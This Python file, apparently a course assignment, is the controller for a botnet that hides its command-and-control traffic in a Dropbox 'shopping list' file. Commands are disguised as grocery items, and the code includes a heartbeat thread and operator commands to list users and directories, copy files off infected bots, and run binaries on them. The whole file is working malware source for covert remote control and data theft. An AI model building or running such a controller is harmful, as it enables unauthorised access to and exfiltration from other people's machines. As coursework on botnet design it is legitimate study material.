#
# Author: Adam Novak
#
# Plagiarism is a sin!
# Plagiarism is a sin!
# Plagiarism is a sin!
#

import sys
from Connection import Connection
import threading
import time


def heartbeat(period, connection, shopping_list, negative_counter):

    # counter
    local_counter = negative_counter

    # send periodical heart beats
    while True:

        is_ok = True
        local_counter -= 1

        # send ALIVE command
        if not connection.append_to_file(shopping_list, "on " + str(local_counter) + " day buy alive cat\n"):
            is_ok = False
            print("\n\033[41mCould not sent heartbeat. Try it again.\n\033[0m")
        else:
            print("\n\033[42mheartbeat sent. \033[0m")

        # Wait for 60 seconds
        time.sleep(period)

        if is_ok:
            print("\n\033[42mm10 bots here.  \033[0m")


def main():

    # get args
    argc = len(sys.argv)
    argv = sys.argv

    # check number of arguments
    if argc != 3:
        exit("python3 controller.py <API KEY> <INTERVAL>")

    # programmer friendly naming
    api_key = argv[1]
    interval = int(argv[2])
    shopping_list = "/shopping_list.txt"

    # create connection
    conn = Connection(api_key)

    # check connection
    if not conn.is_connected():
        exit("Could not to connect to Dropbox!")

    # counters
    negative_counter = 0
    positive_counter = 0

    # create shopping list
    if not conn.exist_file(shopping_list):
        if not conn.create_file(shopping_list):
            exit("Could not create shopping list!")
    # get counters from existing list
    else:
        data = conn.get_file_content(shopping_list).decode('utf-8').split('\n')
        for row in data:
            if len(row) > 0:
                c = int(row.split()[1])
                if c < 0:
                    negative_counter = min(negative_counter, c)
                else:
                    positive_counter = max(positive_counter, c)

    # introduction
    print("   ___     ___   __   __")
    print("  | _ )   / __|  \ \ / /")
    print("  | _ \   \__ \   \ V / ")
    print("  |___/   |___/    |_|  ")
    print("")
    print("Supported commands:")
    print("w               list of users currently logged in")
    print("ls <PATH>       list content of specified directory")
    print("id              ID of current user")
    print("copy <PATH>     copy a file from the bot to the controller")
    print("exec <PATH>     execute a binary inside the bot given the path of the binary")
    print("")

    # start heartbeat
    heartbeat_thread = threading.Thread(target=heartbeat, args=(interval, conn, shopping_list, negative_counter))
    heartbeat_thread.start()

    # counter for commands
    counter = positive_counter

    # send commands
    while True:

        counter += 1

        # read command
        command = input("What is you command: ").split()

        # command w
        if len(command) == 1 and command[0] == "w":
            encrypted_command = "on " + str(counter) + " day buy wine\n"
        # command ls
        elif len(command) == 2 and command[0] == "ls":
            encrypted_command = "on " + str(counter) + " day buy list\n"
        # command id
        elif len(command) == 1 and command[0] == "id":
            encrypted_command = "on " + str(counter) + " day buy identity\n"
        # command copy
        elif len(command) == 2 and command[0] == "copy":
            encrypted_command = "on " + str(counter) + " day buy copy machine\n"
        # command w
        elif len(command) == 2 and command[0] == "exec":
            encrypted_command = "on " + str(counter) + " day buy exponents\n"
        # empty command
        elif len(command) == 0:
            continue
        # unknown
        else:
            print("Unknown command. Try it again.\n")
            continue

        # try to send command
        if not conn.append_to_file(shopping_list, encrypted_command):
            print("Could not write command. Try it again.\n")
            continue

        print("command sent!")
        print("\n")


if __name__ == "__main__":
    main()



